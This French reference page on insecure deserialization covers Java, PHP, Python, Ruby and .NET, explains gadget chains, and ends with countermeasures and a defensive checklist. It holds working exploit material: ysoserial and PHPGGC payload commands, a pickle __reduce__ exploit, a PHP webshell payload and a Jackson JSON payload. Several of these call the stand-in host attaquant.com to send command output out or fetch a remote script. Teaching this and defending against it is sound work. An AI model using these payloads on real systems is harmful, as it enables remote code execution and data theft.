---
title: Insecure Deserialization
domain: sciences-appliquées
subdomain: informatique / sécurité / web
tags: [deserialization, java, python, php, rce, web, sécurité]
date: 2026-03-22
---

# Insecure Deserialization

La désérialisation non sécurisée se produit quand une application reconstruit des objets à partir de données contrôlées par l'utilisateur sans validation. Elle peut mener à l'exécution de code arbitraire (RCE), l'escalade de privilèges, ou le contournement d'authentification.

## Concepts fondamentaux

```
Sérialisation   : objet → flux d'octets / JSON / XML / ...
Désérialisation : flux d'octets → objet

Risque : si les données entrantes sont modifiées avant désérialisation,
l'application peut reconstruire un objet malveillant.
```

Les "gadget chains" sont des séquences d'appels de méthodes légitimes déclenchées automatiquement lors de la désérialisation (constructeurs, `__wakeup__`, `readObject`) qui, enchaînées, produisent un effet malveillant.

## Java

### Format natif (ObjectInputStream)

```java
// Code vulnérable
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();  // ← Désérialise sans vérification
```

Les objets Java sérialisés commencent par les bytes magiques `AC ED 00 05` (hex) ou `rO0A` en base64.

```bash
# Détecter des objets Java sérialisés dans un paramètre base64
echo "rO0ABXNyAC..." | base64 -d | xxd | head
# AC ED 00 05 → objet Java sérialisé
```

### Ysoserial — génération de payloads

```bash
# Générer un payload RCE avec la gadget chain CommonsCollections1
java -jar ysoserial.jar CommonsCollections1 "curl http://attaquant.com/$(id)" > payload.ser

# Gadget chains disponibles selon les bibliothèques présentes sur le serveur
# CommonsCollections1/3/5/6 → Apache Commons Collections < 3.2.2 / < 4.0.1
# Spring1/Spring2               → Spring Framework
# Groovy1                       → Groovy
# BeanShell1                    → BeanShell
# Hibernate1                    → Hibernate

# Injecter dans un paramètre base64
payload=$(java -jar ysoserial.jar CommonsCollections6 "id" | base64 -w 0)
curl -X POST https://target.com/api/object \
  -H "Content-Type: application/octet-stream" \
  --data-binary @payload.ser
```

### Détection avec gadgetinspector

```bash
# Analyse statique d'un JAR pour trouver les gadget chains
java -jar gadgetinspector.jar target-application.jar
```

## PHP

### Sérialisation PHP native

```php
// Format sérialisé PHP
// O:4:"User":2:{s:4:"name";s:5:"alice";s:5:"admin";b:0;}
// O = Object, 4 = longueur du nom de classe, "User" = classe
// 2 = nombre de propriétés
// b:0 = boolean false

// Code vulnérable
$data = unserialize($_COOKIE['user_data']);

// Objet malveillant — manipulation du paramètre admin
// O:4:"User":2:{s:4:"name";s:5:"alice";s:5:"admin";b:1;}
//                                                       ^ true → admin
```

### Magic methods exploitables

```php
class FileLogger {
    public $filename;
    public $content;

    // Appelé automatiquement lors de la désérialisation
    public function __wakeup() {
        file_put_contents($this->filename, $this->content);
    }

    // Appelé lors de la destruction de l'objet
    public function __destruct() {
        file_put_contents($this->filename, $this->content);
    }
}

// Payload : écrire un webshell
// O:10:"FileLogger":2:{s:8:"filename";s:15:"/var/www/s.php";s:7:"content";s:29:"<?php system($_GET['cmd']); ?>";}
```

### PHPGGC — équivalent de ysoserial pour PHP

```bash
# Lister les gadget chains disponibles
./phpggc -l

# Générer un payload pour Laravel RCE
./phpggc Laravel/RCE1 system id -b  # -b = base64

# Pour Symfony
./phpggc Symfony/RCE4 exec "curl http://attaquant.com/" -b

# Injection dans un cookie
cookie_value=$(./phpggc Laravel/RCE1 system id -b)
curl https://target.com/ -H "Cookie: laravel_session=$cookie_value"
```

## Python (Pickle)

```python
# Code vulnérable — jamais désérialiser pickle depuis une source non fiable
import pickle
import base64

data = base64.b64decode(request.get('data'))
obj = pickle.loads(data)  # ← Dangereux

# Exploit : créer un objet malveillant
import pickle, os

class Exploit(object):
    def __reduce__(self):
        # __reduce__ est appelé lors de la sérialisation/désérialisation
        return (os.system, ('curl http://attaquant.com/$(id)',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
# Ce payload, désérialisé par la victime, exécute la commande
```

## Ruby (Marshal)

```ruby
# Code vulnérable
obj = Marshal.load(Base64.decode64(params[:data]))

# Marshal peut invoquer des méthodes à la désérialisation
# Gadgets : Universal Deserialisation Gadget for Ruby 2.x
# https://github.com/jruby/jruby/wiki/UniversalDeserializationGadget
```

## .NET (BinaryFormatter)

```csharp
// Code vulnérable (obsolète depuis .NET 5)
BinaryFormatter formatter = new BinaryFormatter();
object obj = formatter.Deserialize(stream);  // ← Dangereux

// Outil : ysoserial.net
// ysoserial.exe -g ObjectDataProvider -f BinaryFormatter -c "cmd /c calc.exe"
```

## Identification en boîte noire

```
Indices de désérialisation :

Java    : paramètre base64 commençant par rO0A, Content-Type: application/x-java-serialized-object
PHP     : cookie/paramètre avec O: ou a: ou s: (format PHP serialisé)
Python  : paramètre base64 commençant par gASV (pickle)
.NET    : AAEAAAD (BinaryFormatter)
JSON    : @class, @type, $type (hints de type pour Jackson, Gson, Json.NET)
XML     : xsi:type="" dans les attributs (XMLDecoder)
```

### Jackson (Java JSON)

```java
// Vulnérable si enableDefaultTyping() est activé
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();  // ← Dangereux

// Payload JSON exploitant com.zaxxer.hikari.HikariDataSource
{"@class":"com.zaxxer.hikari.HikariDataSource",
 "jdbcUrl":"jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://attaquant.com/exploit.sql'"}
```

## Contre-mesures

```java
// Java — utiliser un ObjectInputStream avec whitelist
public class SafeObjectInputStream extends ObjectInputStream {
    private static final Set<String> ALLOWED = Set.of(
        "com.myapp.SafeClass",
        "java.util.ArrayList"
    );

    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException {
        if (!ALLOWED.contains(desc.getName())) {
            throw new InvalidClassException("Classe non autorisée : " + desc.getName());
        }
        return super.resolveClass(desc);
    }
}

// Utiliser des agents de sécurité : SerialKiller, NotSoSerial
// Agent à ajouter au JVM : -javaagent:serialkiller.jar
```

```python
# Python — ne jamais utiliser pickle avec des données externes
# Utiliser JSON ou des formats sans exécution de code
import json
obj = json.loads(data)  # Sûr si le schéma est validé ensuite

# Si pickle est indispensable → signer les données
import hmac, hashlib, pickle

SECRET = b"cle_secrete_longue"

def serialize(obj):
    data = pickle.dumps(obj)
    sig = hmac.new(SECRET, data, hashlib.sha256).hexdigest()
    return sig + ":" + data.hex()

def deserialize(payload):
    sig, data_hex = payload.split(":", 1)
    data = bytes.fromhex(data_hex)
    expected = hmac.new(SECRET, data, hashlib.sha256).hexdigest()
    if not hmac.compare_digest(sig, expected):
        raise ValueError("Signature invalide")
    return pickle.loads(data)
```

```
Checklist défensive :
✓ Ne jamais désérialiser des données non fiables avec des formats natifs (pickle, Marshal, BinaryFormatter)
✓ Utiliser des formats sans exécution de code (JSON + validation de schéma)
✓ Implémenter une whitelist de classes autorisées à la désérialisation
✓ Signer cryptographiquement les données sérialisées avant de les envoyer au client
✓ Exécuter la désérialisation dans un sandbox sans accès réseau/filesystem
✓ Surveiller les bibliothèques : Commons Collections, Spring, Groovy (gadget chains connues)
✓ Mettre à jour les dépendances — la plupart des gadget chains exploitent des versions obsolètes
```
